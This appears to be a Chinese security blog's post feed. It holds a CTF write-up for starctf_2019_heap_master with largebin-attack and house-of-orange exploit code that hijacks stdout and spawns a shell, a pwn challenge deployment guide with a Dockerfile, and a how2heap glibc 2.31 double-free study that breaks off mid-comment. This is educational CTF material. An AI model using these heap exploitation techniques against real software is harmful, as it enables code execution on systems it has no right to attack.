<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0</span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 485)</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 483)</span><br></pre></td></tr></table></figure>

<h4 id="exp拆分讲解"><a href="#exp拆分讲解" class="headerlink" title="exp拆分讲解"></a>exp拆分讲解</h4><h5 id="在heapbase布局堆内存"><a href="#在heapbase布局堆内存" class="headerlink" title="在heapbase布局堆内存"></a>在heapbase布局堆内存</h5><p>布局了0x421,0x431,0x91大小的堆内存，其他的0x21是用来隔离的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<h5 id="将第一个chunk放入largebin中"><a href="#将第一个chunk放入largebin中" class="headerlink" title="将第一个chunk放入largebin中"></a>将第一个chunk放入largebin中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br></pre></td></tr></table></figure>

<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h5><p>largebin_attack就要对large_chunk的bk和bk_nextsize进行修改，这道题目中我们可以不断的通过edit()对heap_base那块内存进行修改和利用 unsortedbin 机制留下libc地址，而我们知道在unsortedbin中只有一个chunk时，必定会在这个chunk的bk，fd上留下libc的地址，所以我们要对这个large_chunk进行修改使它经过多次free()的机制留下libc地址</p>
<p>接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</p>
<blockquote>
<p>这里为什么留下libc的地址呢？</p>
<p>因为我们要劫持_IO_2_1_stdout_，它也是libc中的地址也在main_arena中，而且低3位是不会变化的，所以我们可以通过低字节覆盖，这样就只剩下一位需要爆破，概率1&#x2F;16</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br></pre></td></tr></table></figure>

<p>覆盖率写在chunk0的libc地址的低字节，使flags字段位于addr1-&gt;fd，错位覆盖的方法使_IO_write_base的最低一字节为<code>\x00</code>，而我们的堆地址偏移设置的正好为<code>~880</code>（满足了hijack stdout的两个条件），通过那一位的爆破（或者重复运行exp）使chunk0-&gt;bk指向stdout就可以实现hijack stdout</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<h5 id="地址计算"><a href="#地址计算" class="headerlink" title="地址计算"></a>地址计算</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br></pre></td></tr></table></figure>

<h5 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h5><p>利用house_of_orange来get shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="新版largebin-attack"><a href="#新版largebin-attack" class="headerlink" title="新版largebin_attack"></a>新版largebin_attack</h2><p><a href="https://blog.csdn.net/yjh_fnu_ltn/article/details/141569981?spm=1001.2014.3001.5502">Large Bin Attack 源码调试</a></p>
<h2 id="总结-large-bin-attack-的利用方法"><a href="#总结-large-bin-attack-的利用方法" class="headerlink" title="总结 large bin attack 的利用方法"></a>总结 large bin attack 的利用方法</h2><p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件（ctf-wiki）：</p>
<ul>
<li>可以修改一个 large bin chunk 的 data</li>
<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
<li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li>
<li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106699487">ha1vk</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn题目部署</title>
    <url>/2025/07/28/pwn%E9%A2%98%E7%9B%AE%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>记录一次pwn题目的部署，本来是想出一道arm_pwn的题目的，但因各种问题最后一步在本地docker中打不通换了一个heap题</p>
<p>网上的arm的Dockerfile较少我这个最终也没搞成功，放在文末还是有一定的参考价值</p>
<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><p>主要参考<a href="https://github.com/RoderickChan/deploy_pwn_template">RoderickChan师傅</a>的github的项目，在这里我用的<a href="https://github.com/RoderickChan/deploy_pwn_template/tree/master/alpine%2Bxinetd%2Bchroot%2Bpatchelf2">alpine+xinetd+chroot+patchelf2</a></p>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>有一些注意事项：</p>
<ul>
<li>在运行<code>./build_image.sh</code>时如果patchelf发生了报错，可以在运行前先给<code>/bin/pwn</code>配置好它的glibc（这里就用.&#x2F;glibc目录下的glibc）</li>
<li>最终打通的目录如下，因为是alpine轻量级的linux，最终的docker大小55MB左右</li>
</ul>
<img data-src="image-20250729102705074.png" alt="image-20250729102705074" style="zoom:67%;" />

<p>最终的dockerfile基本没什么变动就不贴了</p>
<h1 id="失败的arm-pwn题目"><a href="#失败的arm-pwn题目" class="headerlink" title="失败的arm_pwn题目"></a>失败的arm_pwn题目</h1><p>最终效果是在本地测试时最终的getshell部分不会执行了，但能够在docker中启动arm程序，也算是做一个参考吧，呜~~~</p>
<p><strong>dockerfile</strong></p>
<p>可以参考的也就这个qemu和lib目录引入docker的这一部分，和run_pwn.sh最终启动的那一部分</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于 ARM PWN 挑战的 Dockerfile</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 第一阶段：获取 qemu-arm-static ---</span></span><br><span class="line"><span class="keyword">FROM</span> multiarch/qemu-<span class="keyword">user</span>-static:latest as qemu</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 第二阶段：最终的运行镜像 ---</span></span><br><span class="line"><span class="keyword">FROM</span> alpine:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 基础环境设置 ---</span></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apk add --no-cache bash coreutils &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">ln</span> -sf `<span class="built_in">which</span> bash` /bin/sh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">	adduser ctf -u 1000 -s /bin/sh -D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=qemu /usr/bin/qemu-arm-static ./qemu-arm</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwn ./pwn</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./lib ./lib</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./flag ./</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./run_pwn.sh /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/ctf.xinetd</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/ls ./bin/ls</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/cat ./bin/cat</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/xinetd /bin/xinetd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x ./bin/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> +x /bin/xinetd &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/bash ./bin/sh</span></span><br><span class="line"><span class="comment"># --- 创建 Chroot 环境 ---</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> ./dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> ./dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> ./dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> ./dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> ./dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 ./dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p ./usr/lib</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 设置文件权限 ---</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 644 ./flag  &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">	<span class="built_in">chmod</span> 711 /run_pwn.sh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">	<span class="built_in">chmod</span> +x ./lib/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">	<span class="built_in">chmod</span> +x ./pwn &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> +x ./qemu-arm &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> +x ./bin/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R root:root .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 启动服务 ---</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> xinetd -f /etc/ctf.xinetd -pidfile /run/xinetd.pid -<span class="built_in">limit</span> 1000 -reuse;<span class="built_in">sleep</span> infinity;</span></span><br></pre></td></tr></table></figure>

<p><strong>run_pwn.sh</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="comment"># set pow using sha256 POW by ENABLE_POOW</span></span><br><span class="line"><span class="keyword">if</span> [ ! -z <span class="variable">$ENABLE_POW</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ENABLE_POW</span>&quot;</span> == <span class="string">&quot;1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;=================proof-of-work=================&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        rand_str=$(<span class="built_in">head</span> -c 27 /dev/urandom | <span class="built_in">base64</span>)</span><br><span class="line">        hash_value=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$rand_str</span>&quot;</span> | <span class="built_in">sha256sum</span> - | <span class="built_in">cut</span> -c 1-64)</span><br><span class="line">        frontend=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$rand_str</span>&quot;</span> | <span class="built_in">cut</span> -c -4 )</span><br><span class="line">        backend=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$rand_str</span>&quot;</span> | <span class="built_in">cut</span> -c 5- )</span><br><span class="line">        prompt=<span class="string">&quot;sha256(XXXX + \&quot;<span class="variable">$&#123;backend&#125;</span>\&quot;) == <span class="variable">$&#123;hash_value&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$prompt</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Gime me XXXX: &quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">read</span> -t 300 -r input_hash</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$input_hash</span>&quot;</span> != <span class="string">&quot;<span class="variable">$frontend</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Proof of work failed!&quot;</span></span><br><span class="line">            <span class="built_in">exit</span> 2</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> ENABLE_POW</span><br><span class="line"></span><br><span class="line"><span class="comment"># override flag from env</span></span><br><span class="line"><span class="comment"># if environmental variable FLAG is not empty string</span></span><br><span class="line"><span class="keyword">if</span> [ ! -z <span class="variable">$FLAG</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(cat /home/ctf/flag)</span>&quot;</span> != <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /home/ctf/flag</span><br><span class="line">        <span class="built_in">chmod</span> 644 /home/ctf/flag</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the env will not pass to ctf</span></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">timeout</span> 300 $(<span class="built_in">which</span> <span class="built_in">chroot</span>) --userspec=1000:1000 /home/ctf ./qemu-arm -L . ./pwn</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>how2heap</title>
    <url>/2025/04/25/how2heap/</url>
    <content><![CDATA[<h1 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc 2.31"></a>glibc 2.31</h1><p>docker-ubuntu-20.04- 2.31-0ubuntu9.16</p>
<p><code>calloc()</code> 函数用于分配一块内存，并初始化所有字节为零。它通常用于需要分配多个元素的数组或结构体，并且希望在分配时将它们的初始值设置为零。<strong>它绕过tcache来分配内存</strong></p>
<p><strong>函数原型</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li><code>num</code>：要分配的元素数量。</li>
<li><code>size</code>：每个元素的字节大小。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时，返回指向分配内存块的指针（类型为 <code>void*</code>）。</li>
<li>如果分配失败，返回 <code>NULL</code>。</li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>效果：实现 double free</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先申请8个chunk，7个用于填充tcachebin,1个用于隔离</p>
<p>然后free掉7个chunk填充tcachebin</p>
<p>继续再申请3个chunk–chunk1,2,3</p>
<p>按顺序free chunk1 chunk2 chunk1</p>
<p>最终再连续申请3次即可得到两个控制chunk1的指针</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>引入tcache机制后fastbin的机制没变，依旧是只检查相邻节点的后一个</p>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>首先申请7个chunk，再申请同样3大小的chunk a b c</li>
<li>填满tcache，再free a  b a 即可在fastbin中形成a-&gt;b&lt;-a</li>
<li>申请出a b 修改 a，实现修改fastbin链表到任意可写的地方</li>
</ul>
<h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>引入tcache之前无需填充tcache，引入tcache之后要填充tcache</p>
<h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><p>通过 double free 实现任意地址写</p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>效果：实现 double free</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">原始参考文献：https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">本文档主要用于演示 malloc_consolidate 的工作原理，以及如何利用双重释放（double free）来获得两个指向同一大块内存的指针，这通常很难直接做到，因为存在前用检查（previnuse check）。有趣的是，这还包括某些大小的 tcache（线程缓存）大小块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714）本质上是合并所有快速分配块（fastbin 